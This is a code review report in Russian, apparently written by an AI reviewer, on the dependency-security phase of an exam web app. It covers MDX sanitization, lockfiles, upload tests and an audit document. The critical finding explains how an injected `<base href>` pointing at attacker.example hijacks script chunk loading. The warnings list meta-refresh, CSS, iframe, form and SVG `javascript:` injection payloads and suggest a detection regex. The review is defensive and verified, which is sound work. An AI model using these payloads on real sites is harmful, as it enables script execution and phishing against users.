---
phase: 02-dependency-security
reviewed: 2026-10-03T20:29:25Z
depth: deep
files_reviewed: 12
files_reviewed_list:
  - app/web/lib/mdx/options.ts
  - app/web/lib/mdx/remarkStripUnsafeJsx.ts
  - app/web/lib/mdx/untrusted.test.ts
  - app/web/package.json
  - app/server/package.json
  - packages/rbac/package.json
  - yarn.lock
  - app/server/src/test-support/http.ts
  - app/server/src/routes/uploads.test.ts
  - app/server/src/lib/sharp-runtime.test.ts
  - e2e/tests/proxy-protection.spec.ts
  - docs/security/dependency-audit.md
findings:
  critical: 1
  warning: 4
  info: 5
  total: 10
status: issues_found
---

# Phase 02: Code Review Report

**Reviewed:** 2026-10-03T20:29:25Z
**Depth:** deep
**Files Reviewed:** 12
**Status:** issues_found

## Summary

Проверены изменения фазы 02 поверх HEAD 7a6f95a: MDX-конвейер (`options.ts`, новый `remarkStripUnsafeJsx.ts`, `untrusted.test.ts`), манифесты трёх воркспейсов, `yarn.lock` (только сверка версий), новые серверные тесты и хелпер, e2e-спека proxy и документ аудита. Контекст: `02-CONTEXT.md` (D-01…D-14), сводки 02-01…02-09, `MdxRenderer.tsx`, `proxy.ts`, `app.ts`, multer-роуты, исходники `next-mdx-remote@6.0.0` (`dist/serialize.js`, `dist/plugins/*`), `react-dom@19.2.2` (`setProp`, `setValueForStyles`), собранный Turbopack-рантайм `app/web/.next/static/chunks/turbopack-*.js`.

Что подтверждено:
- Порядок плагинов корректен. `getCompileOptions` в next-mdx-remote 6 добавляет `removeImportsExportsPlugin` и `removeJavaScriptExpressions` в конец `remarkPlugins`; `remarkMdxStyleToEstree` теперь в `rehypePlugins`, то есть после `blockJS`, и строит ESTree только из `Literal`, полученных `style-to-object`. Код автора в ESTree не попадает. MDX-JSX узлы проходят `rehypeRaw` через `passThrough: MDX_PASS` с тем же массивом `attributes`. Потерь стилей сверх принятого D-08 (`{…}`, `style={{…}}`) доказать не удалось.
- `yarn.lock`: по одной версии sharp 0.35.5 (`^0.35.4, ^0.35.5`), multer 2.4.0, next 16.3.8, @next/mdx 16.3.8, next-mdx-remote 6.0.0, express 4.22.3 с path-to-regexp 0.1.13, lodash 4.18.1; postcss 8.5.28 и 8.5.23 (пин next), как записано.
- Удалённые пакеты (tinymce, pm2, gray-matter, postcss-cli, autoprefixer, sass, `@tiptap/*` в web и rbac, `@types/sharp`) вне `package.json` и `yarn.lock` нигде не упоминаются. PostCSS-конфиг web живёт в `app/web/package.json` (`"postcss": {"plugins": {"@tailwindcss/postcss": {}}}`), autoprefixer ему не нужен. sharp 0.35 поставляет свои типы.
- Документ аудита: выборочно сверены terser-webpack-plugin 5.3.16, @vercel/node 3.2.29, @vercel/nft 0.27.3, @mapbox/node-pre-gyp 1.0.11, tar 6.2.1, undici 5.28.4, node-gyp 12.2.0 (`node-gyp@npm:latest`), webpack 5.104.1, `bcryptjs` на сервере, корневой `resolutions` только с `@types/react*`. Всё совпадает с lockfile и манифестами, D-13/D-14 не нарушены (аудит не добавлен в `yarn verify`/CI, `resolutions` не добавлены).
- Серверные тесты: `pgPool.end()`, `scratch.drop()`, восстановление `TEST_DATABASE_URL`, `server.closeAllConnections()` на месте; `vi.mock` действует в пределах файла (изоляция Vitest по умолчанию); флаг `globalThis.__mdxPwned` сбрасывается в `beforeEach`.
- Тесты обрыва загрузки не флапают в текущем виде: `abortUpload` завершается по `close` запроса независимо от того, ответил ли сервер раньше, `waitForHealthz` опрашивает с ограничением по времени. Единственная слабость: `uploads.length === 0` проверяется до гарантированного завершения оборванного запроса на сервере. Ложного прохождения для полной загрузки это не даёт.
- `e2e/tests/proxy-protection.spec.ts`: замечаний нет. Проверки `%64ashboard` и вырезания `_rsc` из `callbackUrl` намеренно закрепляют нормализацию путей в Next: это и есть поверхность advisory, которую тест проверяет.
- Правило «без комментариев в коде»: в новых файлах (`remarkStripUnsafeJsx.ts`, `untrusted.test.ts`, `http.ts`, `uploads.test.ts`, `sharp-runtime.test.ts`, `proxy-protection.spec.ts`) и в диффе `options.ts` комментариев нет.

Главная проблема: `remarkStripUnsafeJsx` работает как короткий чёрный список (`script`, `srcdoc`, `on*`). Без CSP на web элемент `<base href>` из текста преподавателя перенаправляет загрузку чанков Turbopack на чужой origin, и чужой JS исполняется в сессии ученика или администратора. Это обход DEP-03, матрица `untrusted.test.ts` его не ловит.

## Narrative Findings (AI reviewer)

## Critical Issues

### CR-01: `<base href>` проходит фильтр и даёт исполнение чужого JS через загрузку чанков (обход DEP-03)

**Severity:** BLOCKER

**File:** `app/web/lib/mdx/remarkStripUnsafeJsx.ts:23-27`, `app/web/lib/mdx/remarkStripUnsafeJsx.ts:34`; матрица `app/web/lib/mdx/untrusted.test.ts:36-94`
**Issue:** Плагин удаляет только элемент `script` и атрибуты `srcdoc`/`on*`. Всё остальное, включая `<base href="https://attacker.example/">`, доходит до React. Цепочка проверена по исходникам:
1. MDX компилирует `<base href="…">` в `_jsx("base", {href})`. `removeJavaScriptExpressions` строковые атрибуты не трогает.
2. React 19.2.2 `setProp` для `href` вызывает только `sanitizeURL`, а она блокирует лишь `javascript:`. `https://…` выставляется как есть (`react-dom-client.production.js:12989-13005`). Особой обработки `base` нет.
3. Документ берёт первый `<base href>` в порядке дерева, даже если элемент в `<body>`. CSP в `app/web` нет: `next.config.ts` заголовков не задаёт, helmet стоит только на API.
4. Рантайм Turbopack собирает URL чанка как `` `${P}${n}${r}` `` с `P="/_next/"` (функция `q` в `app/web/.next/static/chunks/turbopack-*.js`) и присваивает его в `script.src`. Путь абсолютный от корня, поэтому браузер разрешает его относительно base URL документа.

После рендера такого текста в `TestRunner` или `AttemptQuestionsList` любой следующий ленивый чанк (переход на другой маршрут, `import()`) грузится с `https://attacker.example/_next/static/chunks/…` и исполняется в origin приложения. Относительные `fetch('/api/…')` тоже уходят на чужой origin (тела запросов, ответы ученика). Тест проверяет только `globalThis`-флаг, `<script`, `on*=` и `srcdoc=`, поэтому эту дыру не видит. DEP-03 («недоверенный MDX не исполняется») фактически не выполнен.
**Fix:** Заменить чёрный список белым: оставить только теги и атрибуты, которые реально выдаёт редактор и разметка, и добавить `base` с соседними тегами в матрицу.
```ts
const ALLOWED_TAGS = new Set([
	'p', 'span', 'div', 'br', 'b', 'strong', 'i', 'em', 'u', 's', 'sub', 'sup', 'mark', 'code', 'pre',
	'img', 'a', 'ul', 'ol', 'li', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'blockquote', 'hr',
	'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'tweet',
])
const ALLOWED_ATTRIBUTES = new Set([
	'style', 'src', 'alt', 'width', 'height', 'href', 'title', 'class', 'classname', 'align', 'colspan', 'rowspan', 'id',
])

visit(tree, (node, index, parent) => {
	if (!isMdxJsxElement(node)) return
	const name = typeof node.name === 'string' ? node.name.toLowerCase() : null
	if (name === null || !ALLOWED_TAGS.has(name)) {
		if (parent && typeof index === 'number') {
			;(parent as ParentLike).children.splice(index, 1)
			return [SKIP, index]
		}
		return
	}
	if (Array.isArray(node.attributes)) {
		node.attributes = node.attributes.filter(
			(attribute) =>
				attribute.type === 'mdxJsxAttribute' &&
				typeof attribute.name === 'string' &&
				ALLOWED_ATTRIBUTES.has(attribute.name.toLowerCase())
		)
	}
})
```
Список тегов нужно сверить с реальными текстами (D-10). Если нужно сохранить содержимое неизвестных тегов, удалять только обёртку, а не весь узел. В `untrusted.test.ts` добавить пейлоады `<base href="https://attacker.test/">`, `<meta http-equiv="refresh" …>`, `<link rel="stylesheet" …>`, `<style>`, `<iframe src>`, `<form action>`, `<object>`/`<embed>` и проверку в `assertInert` вроде `assert.doesNotMatch(html, /<(base|meta|link|style|iframe|form|object|embed)\b/i)`. Независимо от этого стоит подумать о CSP для web, хотя бы `base-uri 'self'`: это закрывает именно этот класс и не ломает текущий рендер.

## Warnings

### WR-01: Остальные теги для подмены контента проходят фильтр, и матрица их не проверяет

**Severity:** WARNING

**File:** `app/web/lib/mdx/remarkStripUnsafeJsx.ts:23-27`; `app/web/lib/mdx/untrusted.test.ts:27-34`
**Issue:** Помимо CR-01 проходят теги, которые сами скрипт не исполняют, но работают против учеников и администраторов:
- `<meta http-equiv="refresh" content="0;url=https://phish.example">`: React 19 поднимает `<meta>` в `<head>`, браузер выполняет редирект при вставке.
- `<link rel="stylesheet" href="https://…" precedence="x">` и `<style>…</style>`: CSS-инъекция на всю страницу (скрыть или подменить варианты ответа, утечка через селекторы атрибутов).
- `<iframe src="https://…">`, `<object data="https://…">`, `<embed>`: чужой контент внутри вопроса. `javascript:` React блокирует, `https:` нет.
- `<form action="https://…">` с полями: фишинг логина.
- `<svg><a><animate attributeName="href" values="javascript:…"/>…</a></svg>`: React не санирует `values`/`to`. Поведение браузеров нужно проверить отдельно; это известный обход защиты React от `javascript:`.

`assertInert` смотрит только `<script`, `on*=`, `srcdoc=` и `__mdxPwned` внутри атрибутов, поэтому регрессию в этих местах не поймает.
**Fix:** Закрывается белым списком из CR-01. Каждый из перечисленных тегов добавить в `PAYLOADS` с проверкой отсутствия тега в HTML.

### WR-02: Запасной путь `MdxRenderer` ловит только ошибки `serialize`, ошибки рендера роняют страницу

**Severity:** WARNING

**File:** `app/web/components/tests/MdxRenderer.tsx:143-154`, `app/web/components/tests/MdxRenderer.tsx:168-175`; зеркально `app/web/lib/mdx/untrusted.test.ts:16-25`
**Issue:** `try/catch` охватывает только `serialize`. Ошибки, которые React бросает при рендере `<MDXRemote>`, уходят выше: ближайший error boundary маршрута или белый экран, а не текстовый fallback. Примеры текста, который проходит `serialize` и падает в рендере (проверено по `react-dom-client.production.js`):
- `<span style="">x</span>`: `remarkMdxStyleToEstree.ts:44` пропускает пустой `style`, строка доходит до React, и `setValueForStyles` бросает ошибку #62 (строка 1293);
- `<img src="a.png">подпись</img>`: void-элемент с детьми, ошибка #137;
- `<div dangerouslySetInnerHTML="x">`: ошибка #61;
- `<Foo />`: в MDX-выводе `_missingMdxReference`, потому что `components` содержит только `img`.

Перенос `remarkMdxStyleToEstree` в rehype поведение с пустым `style` не изменил, но тест повторяет ту же слепую зону: `renderUntrusted` ловит только `serialize`, а `renderToString` с ошибкой просто роняет тест. Ни один эталон такие формы не покрывает. Один такой вопрос преподавателя ломает страницу прохождения теста для всех учеников.
**Fix:** Обернуть `<MDXRemote>` в error boundary с тем же fallback `<div className={className ?? ''}>{normalized}</div>`. В `remarkMdxStyleToEstree` при пустом `styleStr` удалять атрибут (`node.attributes.splice(idx, 1)`), а не оставлять строку. Белый список из CR-01 снимает `dangerouslySetInnerHTML` и неизвестные компоненты. В тест добавить эталоны с пустым `style` и `<img>` с детьми; ожидание — fallback или отсутствие исключения.

### WR-03: Тесты загрузок фиксируют ответ 500 и текст ошибки, который виден только вне production

**Severity:** WARNING

**File:** `app/server/src/routes/uploads.test.ts:166-167`, `:173-174`, `:271-272`, `:369-370`, `:384-385`; источник `app/server/src/app.ts:137-143`
**Issue:** Ошибки multer (`fileFilter`, `LIMIT_FILE_SIZE`, `Unexpected end of form`, `Field name missing`) не являются `ApiError` и не несут `status`, поэтому `errorHandler` отдаёт 500, а `err.message` показывает только при `NODE_ENV !== 'production'`. Тест проверяет `status === 500` и `body.error === 'File too large'` и т.п. Значит:
- он закрепляет как контракт ошибку обработчика (клиентская ошибка превращается в 500). Безвредная правка вроде маппинга `MulterError` в 400/413 уронит 12 проверок;
- текст ошибки проверяется в окружении, которого нет в production: там пользователь получает `Internal Server Error`. Тест создаёт впечатление, что сообщение о лимите доходит до клиента, а это не так.
**Fix:** Проверять смысл, а не реализацию: `assert.ok(reply.status >= 400 && reply.status < 600)` вместе с `uploads.length === 0`, а текст ошибки сверять только там, где он часть контракта (400 от проверки сигнатуры). Если 500 нужен как характеризация (D-11), вынести его в явный `test.fails`/`@known-defect` с ожидаемым 413/400, как D1/D2/D5 фазы 1, и записать дефект.

### WR-04: В документе аудита статус serialize-javascript «зависимость убрана», а в дереве она осталась

**Severity:** WARNING

**File:** `docs/security/dependency-audit.md:53` (и строки tar `:48`, `:54-61`)
**Issue:** В колонке «Статус или решение» для serialize-javascript 6.0.2 стоит «зависимость убрана: terser-webpack-plugin 5.3.17 и выше не зависит…». В `yarn.lock` остаётся `terser-webpack-plugin@npm:^5.3.16` версии 5.3.16 с `serialize-javascript: "npm:^6.0.2"` (yarn.lock:13318). Убрана она только upstream; в репозитории `yarn up -R` не выполнялся (02-09-SUMMARY, key-decisions). Колонка статуса читается как выполненное действие, и запись остатка (DEP-04, D-14) описывает несуществующее состояние. Мелочь там же: в строках tar путь через `@bio-exam/server -> @vercel/node` (devDependency) отнесён к «build-инструмент», хотя по категориям документа (`:37-40`) это «dev-инструмент».
**Fix:** Переформулировать: «upstream исправил в terser-webpack-plugin 5.3.17 (в пределах диапазона webpack `^5.3.16`); в yarn.lock 5.3.16, `yarn up -R terser-webpack-plugin` не выполнялся: build-инструмент». Для tar указать достижимость по каждому пути: «build-инструмент (bcrypt); dev-инструмент (@vercel/node)».

## Info

### IN-01: Плагин с mdast-типами и префиксом `remark` работает в `rehypePlugins`, несоответствие скрывает приведение типа

**Severity:** INFO

**File:** `app/web/lib/mdx/options.ts:21-25`; `app/web/lib/mdx/remarkMdxStyleToEstree.ts:2`, `:32-33`
**Issue:** `remarkMdxStyleToEstree` объявлен как `(tree: Root)` из `mdast`, а вызывается на hast-дереве. Сейчас это работает, потому что MDX-JSX узлы в hast имеют ту же форму. Но `as import('unified').Pluggable[]` прячет несоответствие от typecheck, а имя `remark*` сбивает: обратный перенос в `remarkPlugins` при «наведении порядка» молча вернёт потерю стилей. Ловит это только эталон style в `untrusted.test.ts`.
**Fix:** Переименовать в `rehypeMdxJsxStyleToEstree`, типизировать через `Root` из `hast`, убрать общий cast и типизировать массивы через `PluggableList`.

### IN-02: Часть проверок в матрице MDX ничего не различает или ломается от безобидных изменений

**Severity:** INFO

**File:** `app/web/lib/mdx/untrusted.test.ts:29`, `:197`, `:203`, `:211`
**Issue:** `assertInert` с `/\son[a-z]+=/i` на SSR-HTML не может упасть на строковых обработчиках: React SSR и клиент вообще не выводят `on*`-пропсы. Реальную защиту даёт только блок `STRIPPED_JSX`. `forbidden: /script|__mdxPwned/i` проверяется по всему `compiledSource`, поэтому любое слово с подстрокой `script` в сгенерированном коде (`javascript`, `description`, `noscript`, будущие хелперы MDX) даст ложное падение.
**Fix:** В `STRIPPED_JSX` искать конкретную форму: `/["']script["']|__mdxPwned/i`. В `assertInert` оставить проверку `on*` как защиту в глубину, но не считать её покрытием.

### IN-03: Smoke-тест Sharp не проверяет rotate и жёстко привязан к Node 24

**Severity:** INFO

**File:** `app/server/src/lib/sharp-runtime.test.ts:11`, `:19-33`; `app/server/src/routes/uploads.test.ts:204-212`
**Issue:** `rotate(90)` применяется к квадратным 4x4 и 64x64 с однотонной заливкой, так что ни размеры, ни пиксели результата не зависят от того, был ли поворот. Сломанный или пропущенный `rotate` тест пропустит. `assert.equal(major, 24)` упадёт при любом обновлении Node, хотя Sharp здесь ни при чём.
**Fix:** Взять неквадратную картинку (4x2) и проверить, что после `rotate(90)` получилось 2x4. Версию Node сравнивать с `.nvmrc`, а не с литералом.

### IN-04: В `app/web` остались неиспользуемые пакеты из той же группы, что D-06

**Severity:** INFO

**File:** `app/web/package.json:97`, `:121` (а также `bcrypt`, `@types/bcrypt`, `webpack`)
**Issue:** `prosemirror-model` и `tiptap-extension-auto-joiner` вне `package.json` не импортируются (rg по `app/web` пуст). Peer `@tiptap/core` после удаления `@tiptap/*` не удовлетворён (YN0086 в `deferred-items.md`). `bcrypt` и `webpack` тянут tar 6.2.1 (1 critical, 10 high), http-cache-semantics и serialize-javascript в production-аудит. Документ аудита это записывает; решения пользователя нет.
**Fix:** Вынести на решение пользователя тем же разбором, что D-06: удаление `prosemirror-model`, `tiptap-extension-auto-joiner`, `bcrypt`, `@types/bcrypt`, `webpack` убирает почти весь остаток production-аудита.

### IN-05: Комментарий в конфиге Vitest web устарел

**Severity:** INFO

**File:** `app/web/vitest.config.ts:10`
**Issue:** Комментарий «Ни один веб-тест не рендерит React, DOM не нужен» теперь неверен: `untrusted.test.ts` рендерит `MDXRemote` через `react-dom/server`. Окружение `node` при этом выбрано правильно.
**Fix:** Удалить или поправить комментарий; по правилу проекта текст комментария пишет пользователь.

---

_Reviewed: 2026-10-03T20:29:25Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
